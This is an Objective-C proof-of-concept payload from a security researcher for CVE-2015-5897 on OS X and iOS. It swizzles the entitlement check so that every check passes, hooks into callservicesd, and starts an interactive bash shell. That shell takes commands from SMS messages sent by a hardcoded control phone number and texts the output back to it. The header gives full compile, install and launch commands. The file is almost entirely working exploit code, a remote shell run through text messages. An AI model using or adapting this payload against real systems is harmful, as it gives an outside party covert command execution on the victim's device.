/* 
OS X 10.10 / iOS 8/9 SMS shell payload for CVE-2015-5897
Author: Dan Bastone <dbastone@gdssecurity.com>
Copyright 2015 Gotham Digital Science
http://blog.gdssecurity.com/

Compile:
	clang -o injectab.sourcebundle/Contents/MacOS/injectab injectab.m -dynamiclib -F/System/Library/PrivateFrameworks/ -framework Foundation -framework IMCore

Install: (disables entitlement check & launches SMS shell)
	launchctl unload /System/Library/LaunchAgents/com.apple.telephonyutilities.callservicesd.plist
	launchctl load csd_launchd.plist
	killall callservicesd
	cp -r injectab.sourcebundle /tmp/

Run: (SMS shell only)
	AB_PLUGIN_PATH=`pwd` /usr/bin/sandbox-exec -p'(version 1)(allow default)(deny file-read* (regex #"^/System/Library/Address Book Plug-Ins/POI*"))' /System/Library/PrivateFrameworks/TelephonyUtilities.framework/callservicesd
*/

#import <objc/runtime.h>
#import <Foundation/Foundation.h>

#define CONTROL_NUMBER	@"+16467530400"

NSPipe *stdinPipe,*stdoutPipe,*stderrPipe;

@interface IMChat : NSObject
- (void)sendMessage:(id)arg1;
- (void)markAllMessagesAsRead;
@end

@interface IMChatRegistry : NSObject
+ (id)sharedInstance;
- (id)chatForIMHandle:(id)arg1;
- (id)existingChatWithChatIdentifier:(id)arg1;
@end

@interface IMAccountController : NSObject
+ (id)sharedInstance;
- (id)bestOperationalAccountForService:(id)arg1;
@end

@interface IMAccount : NSObject
@property(readonly, nonatomic) id loginIMHandle;
@end
@interface IMHandle : NSObject
@property(readonly, retain, nonatomic) IMAccount *account;
- (id)initWithAccount:(id)arg1 ID:(id)arg2;
@end

@interface IMMessage : NSObject
+ (id)instantMessageWithText:(id)arg1 messageSubject:(id)arg2 flags:(unsigned long long)arg3;
- (void)_updateSender:(id)arg1;
@end

@interface IMItem
- (NSString *)sender;
@end
@interface IMMessageItem : IMItem
@property(retain, nonatomic) NSData *bodyData;
@property(retain, nonatomic) NSAttributedString *body;
@end

@interface IMDaemonListener : NSObject
- (void)addHandler:(id)arg1;
@end

@interface IMDaemonController : NSObject
+ (id)sharedInstance;
- (BOOL)addListenerID:(id)arg1 capabilities:(unsigned int)arg2;
@property(readonly, nonatomic) IMDaemonListener *listener;
@end

@interface IMService : NSObject
+ (id)smsService;
@end

@interface IMServiceImpl : IMService
+ (void)setServiceClass:(Class)arg1;
@end

@interface Service : IMServiceImpl
+ (void)initialize;
+ (void)daemonConnectionLost:(id)arg1;
+ (void)daemonDidConnect:(id)arg1;
+ (void)daemonWillConnect:(id)arg1;
@end

@interface GDSListener : NSObject
- (void)account:(NSString *)arg1 chat:(NSString *)arg2 style:(unsigned char)arg3 chatProperties:(NSDictionary *)arg4 messageReceived:(IMItem *)arg5;
@end

@implementation GDSListener
- (void)account:(NSString *)arg1 chat:(NSString *)chatID style:(unsigned char)arg3 chatProperties:(NSDictionary *)arg4 messageReceived:(IMMessageItem *)msg {
//	NSLog(@"acct %@ chat %@ style %c prop %@ recv %@",arg1,chatID,arg3,arg4,msg);

	if (![msg.sender isEqualToString:CONTROL_NUMBER])
		return;

	IMChat *chat = [[IMChatRegistry sharedInstance] existingChatWithChatIdentifier:chatID];
	[chat markAllMessagesAsRead];

	NSString *body = [msg.body.string stringByAppendingString:@"\r"];
	NSLog(@"sending to shell: %@",body);
	[[stdinPipe fileHandleForWriting] writeData:[body dataUsingEncoding:NSUTF8StringEncoding]];
}
@end

extern NSString *IMDaemonWillConnectNotification,*IMDaemonDidConnectNotification,*IMDaemonConnectionLostNotification;
extern int32_t kFZListenerCapAppleLegacyVC, kFZListenerCapManageStatus, kFZListenerCapChats, kFZListenerCapFileTransfers, kFZListenerCapAuxInput, kFZListenerCapAccounts, kFZListenerCapBuddyList, kFZListenerCapIDQueries;

@implementation Service
+ (void)initialize {
	IMDaemonController *dc = [IMDaemonController sharedInstance];
	NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];

	[IMServiceImpl setServiceClass:[Service class]];
	[[dc listener] addHandler:[[[GDSListener alloc] init] autorelease]];
	[nc addObserver:[Service class] selector:@selector(daemonWillConnect:) name:IMDaemonWillConnectNotification object:0x0];
	[nc addObserver:[Service class] selector:@selector(daemonDidConnect:) name:IMDaemonDidConnectNotification object:0x0];
	[nc addObserver:[Service class] selector:@selector(daemonConnectionLost:) name:IMDaemonConnectionLostNotification object:0x0];

	[dc addListenerID:@"com.apple.iChat" capabilities:kFZListenerCapAppleLegacyVC | kFZListenerCapManageStatus | kFZListenerCapChats | kFZListenerCapFileTransfers | kFZListenerCapAuxInput | kFZListenerCapAccounts | kFZListenerCapBuddyList | kFZListenerCapIDQueries];
}

+ (void)daemonDidConnect:(id)arg1 {
	NSLog(@"daemonDidConnect: %@",arg1);
	static dispatch_once_t token;
	dispatch_once(&token, ^{
		stdinPipe = [NSPipe pipe];
		stdoutPipe = [NSPipe pipe];
		stderrPipe = [NSPipe pipe];

		void (^shellout)(NSFileHandle *) = ^(NSFileHandle *h) {
         NSData *data = [h availableData];
         NSString *s = [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] autorelease];
         NSLog(@"shell output (fd %d): %@",h.fileDescriptor, s);

			id svc = [IMServiceImpl smsService];
			IMAccount *account = [[IMAccountController sharedInstance] bestOperationalAccountForService:[IMService smsService]];
			IMHandle *recipient = [[[IMHandle alloc] initWithAccount: account ID:CONTROL_NUMBER] autorelease];
			IMChat *chat = [[IMChatRegistry sharedInstance] chatForIMHandle:recipient];
			NSAttributedString *text = [[[NSAttributedString alloc] initWithString:s] autorelease];
			IMMessage *msg = [IMMessage instantMessageWithText:text messageSubject:nil flags:5];
			[msg _updateSender:[account loginIMHandle]];
//			NSLog(@"msg %@",msg);
			[chat sendMessage:msg];
      };

		[stdoutPipe.fileHandleForReading setReadabilityHandler:shellout];
		[stderrPipe.fileHandleForReading setReadabilityHandler:shellout];

		NSTask *task = [[NSTask alloc] init];
		[task setLaunchPath:@"/bin/bash"];
		[task setArguments:@[@"-l",@"-i"]];
		[task setStandardInput:stdinPipe];
		[task setStandardOutput:stdoutPipe];
		[task setStandardError:stderrPipe];
		[task setEnvironment:@{@"TERM": @"dumb"}];
		[task launch];
	});
}

+ (void)daemonWillConnect:(id)arg1 {
	NSLog(@"daemonWillConnect: %@",arg1);
}
+ (void)daemonConnectionLost:(id)arg1 {
	NSLog(@"daemonConnectionLost: %@",arg1);
}
@end

Service *service;

@implementation NSXPCConnection(Overrides)
+(void)load {
	static dispatch_once_t token;
	dispatch_once(&token, ^{
		Class class = [self class];
		Method orig = class_getInstanceMethod(class, @selector(valueForEntitlement:));
		Method swiz = class_getInstanceMethod(class, @selector(my_valueForEntitlement:));
		method_exchangeImplementations(orig,swiz);
		NSLog(@"entitlement checks bypassed");
		service = [[Service alloc] init];
	});
}

-(id)my_valueForEntitlement:(id)arg1 {
	return @1;
}
@end
